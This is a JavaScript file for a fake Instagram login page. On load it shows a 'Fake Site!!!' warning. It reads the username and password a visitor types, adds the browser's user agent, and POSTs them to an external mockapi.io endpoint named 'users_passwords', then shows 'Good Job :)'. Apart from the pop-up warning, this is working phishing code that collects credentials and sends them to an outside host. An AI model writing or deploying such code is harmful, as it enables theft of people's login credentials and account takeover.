const $ = document;
const APIAddress =
  "https://659d152f633f9aee79089070.mockapi.io/users_passwords";

window.addEventListener(`load`, () => {
  Swal.fire({
    title: "Fake Site!!!",
    text: "Please notice that this page is not real instagram login page!",
    icon: "warning",
  });

  const submitBtnSelector = $.querySelector(`#submit-btn`);
  const usernameInputSelector = $.querySelector(`.username-input`);
  const passwordInputSelector = $.querySelector(`.password-input`);

  usernameInputSelector.addEventListener(`keyup`, () => {
    if (
      usernameInputSelector.value.trim().length > 3 &&
      passwordInputSelector.value.trim().length > 4
    ) {
      submitBtnSelector.removeAttribute(`disabled`);
    } else {
      submitBtnSelector.setAttribute(`disabled`, "");
    }
  });
  passwordInputSelector.addEventListener(`keyup`, () => {
    if (
      usernameInputSelector.value.trim().length > 3 &&
      passwordInputSelector.value.trim().length > 4
    ) {
      submitBtnSelector.removeAttribute(`disabled`);
    } else {
      submitBtnSelector.setAttribute(`disabled`, "");
    }
  });

  submitBtnSelector.addEventListener(`click`, (e) => {
    e.preventDefault();

    let user = {
      username: usernameInputSelector.value.trim().toLowerCase(),
      password: passwordInputSelector.value.trim().toLowerCase(),
      userAgent: navigator.userAgent,
    };

    fetch(APIAddress, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(user),
    }).then((res) => {
      if (res.ok) {
        Swal.fire({
          title: "Good Job :)",
          icon: "success",
        }).then(() => location.reload());
      } else {
        Swal.fire({
          title: "Something went wrong :(",
          icon: "error",
        }).then(() => location.reload());
      }
    });
  });
});
